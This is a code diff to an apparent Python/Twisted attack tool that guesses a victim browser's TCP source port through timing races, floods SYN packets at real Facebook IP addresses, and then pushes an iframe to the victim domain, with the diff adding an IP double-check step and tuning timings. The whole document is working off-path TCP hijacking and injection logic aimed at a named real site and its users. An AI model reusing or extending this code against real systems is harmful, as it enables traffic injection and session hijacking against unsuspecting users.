@@ -71,7 +71,7 @@ TEST_VICTIM_IP = '12.168.1.113'
 #VICTIM_SITE = '69.171.228.74'
 #VICTIM_DOMAIN = 'www.facebook.com' # TTL = 30
 
-VICTIM_SITE = '69.171.229.11'
+VICTIM_SITE = '66.220.149.11'
 VICTIM_DOMAIN = 'facebook.com' # TTL = 7200, but there are 5 of them
 
 # TODO: loop over all these to figure out which one we are during port
@@ -90,6 +90,7 @@ STATE_INIT = 1
 STATE_SOURCE_PORT_GUESS = 2
 STATE_SOURCE_PORT_FINAL = 3
 STATE_BW_TEST = 4
+STATE_IP_DOUBLE_CHECK = 5
 
 class ControlWebSocket(Protocol):
     """
@@ -207,12 +208,34 @@ class ControlWebSocket(Protocol):
                     self.max_port = int(self.min_port) + 40
                     self.mid_port = int(self.min_port) + 20
                 return
-            print 'Success!!! we did it! port: %d' % port
-            self.transport.write("show <b>Used port %d</b>" % port) 
-            
+            print 'Found port %d used for %s' % (port, VICTIM_SITE_IPS[self.ip_guess_index])
+            self.transport.write("Found port <b>%d</b> for %s" % (port, VICTIM_SITE_IPS[self.ip_guess_index])) 
+            print 'Checking if %s matches %s...' % (VICTIM_SITE_IPS[self.ip_guess_index], VICTIM_DOMAIN)
+            self.state = STATE_IP_DOUBLE_CHECK
+            self.min_port = int(port) + 5
+            self.mid_port = self.min_port
+            self.max_port = self.min_port
+
+            self.wrong_final_count = 0
+
+            return
+        elif (self.state == STATE_IP_DOUBLE_CHECK):
+            if success:
+                port = self.min_port
+            else:
+                self.wrong_final_count += 1
+                if (self.wrong_final_count >= 5):
+                    self.state = STATE_SOURCE_PORT_GUESS
+                    self.bucket = 0
+                    self.bucket_search = True
+                    print 'Sorry, looks like %s was not %s...try again' \
+                            % (VICTIM_DOMAIN, VICTIM_SITE_IPS[self.ip_guess_index])
+                return
+
+            print 'It was totally it!!!'
             self.transport.write("init_iframe http://%s" % (VICTIM_DOMAIN))
                         
-            reactor.callLater(13.37, self.make_iframe)
+            reactor.callLater(1.5, self.make_iframe)
             self.seq_spew_port = port + 1
 
             #reactor.stop()
@@ -288,7 +311,7 @@ class ControlWebSocket(Protocol):
         reactor.callLater(NEW_CONNECTION_PERIOD, self.cleanupOldWebsocket)
        
 
-    def fireAgain(self):
+    def fireAgain(self, url=VICTIM_SITE):
         """
         start constructing and spewing syn packets to victim
         """
@@ -305,7 +328,7 @@ class ControlWebSocket(Protocol):
             testing = "(bucket) testing"
         self.transport.write("show <b>%s %s:%d - %d...</b>" % \
             (testing, VICTIM_SITE_IPS[self.ip_guess_index], self.min_port, self.mid_port))
-        self.transport.write("make ws://%s/" % (VICTIM_DOMAIN)) 
+        self.transport.write("make ws://%s/" % (url))
         #self.transport.write("img %s" % (VICTIM_SITE_IMG % (random.randint(0,10000000), random.randint(0,10000000)))) # toodo: just increment, birthday-attack boy.
 
         self.fire_time = time.time()
@@ -326,15 +349,23 @@ class ControlWebSocket(Protocol):
         # using. This function determines what our next guesses should be,
         # given the current information.
         # either we won/lost the race ("timeout"/"closed"), 
-        if not(data == 'closed' or data == 'timeout'):
+        if not(data.startswith('closed') or data.startswith('timeout')):
             return
 
-        if data == 'closed':
+        if data.startswith('closed'):
             we_won = False
-            print 'Lost the race'
+            diff = float(data[len('closed '):])
+            print 'Lost the race %f' % diff
         else:
             we_won = True
-            print 'Won the race'
+            diff = float(data[len('timeout '):])
+            print 'Won the race %f' % diff
+
+        if (self.state == STATE_IP_DOUBLE_CHECK):
+            # Since we're only checking one port, this should be really fast.
+            # since we don't know the IP, we can't rely on the browser's RTT 
+            # threshold, so we just set an arbitrary 35ms here. FIXME?
+            we_won = (diff < 0.035)
 
         self.killSpewer()
 
@@ -365,11 +396,11 @@ class ControlWebSocket(Protocol):
                     # still doing a linear search over buckets
                     self.bucket += 1
                     if (self.bucket == self.NUM_BUCKETS):
-                        print 'Ah, well that is the game :('
-                        self.ip_guess_index += 1
-                        self.ip_guess_index %= len(VICTIM_SITE_IPS)
+                        print 'Ah, well that is the game :(...trying again...'
+                        #self.ip_guess_index += 1
+                        #self.ip_guess_index %= len(VICTIM_SITE_IPS)
                         self.bucket = 0
-                        print 'But wait, there\'s more! (index %d' % self.ip_guess_index 
+                        #print 'But wait, there\'s more! (index %d' % self.ip_guess_index 
 
         else:
             # Doing binary search
@@ -378,7 +409,7 @@ class ControlWebSocket(Protocol):
                 we_won = (True in self.votes)
                 self.votes = []
                 self.adjustBucket(we_won)
-            elif self.state == STATE_SOURCE_PORT_FINAL:
+            elif (self.state == STATE_SOURCE_PORT_FINAL or self.state == STATE_IP_DOUBLE_CHECK):
                 self.adjustBucket(we_won)
             else:
                 self.incrementBuckets()
@@ -447,7 +478,8 @@ class ControlWebSocket(Protocol):
         # Received data from the control websocket
         # 
         if self.state == STATE_SOURCE_PORT_GUESS or \
-           self.state == STATE_SOURCE_PORT_FINAL:
+           self.state == STATE_SOURCE_PORT_FINAL or \
+           self.state == STATE_IP_DOUBLE_CHECK:
             self.handlePortDetectionResult(data)
 
         elif self.state == STATE_INIT:
@@ -468,5 +500,5 @@ class ControlWebSocket(Protocol):
         self.fire_time = time.time()
         self.state = STATE_INIT
         self.ip_guess_index = 0  # index into VICTIM_SITE_IPS[]
-        self.transport.write("calm ws://%s/" % (VICTIM_DOMAIN)) 
+        self.transport.write("calm ws://%s/" % (VICTIM_SITE_IPS[self.ip_guess_index])) 
         #self.transport.write("calm %s" % (VICTIM_SITE_IMG % (random.randint(0,10000000), random.randint(0,10000000)))) # toodo: just increment, birthday-attack boy. 
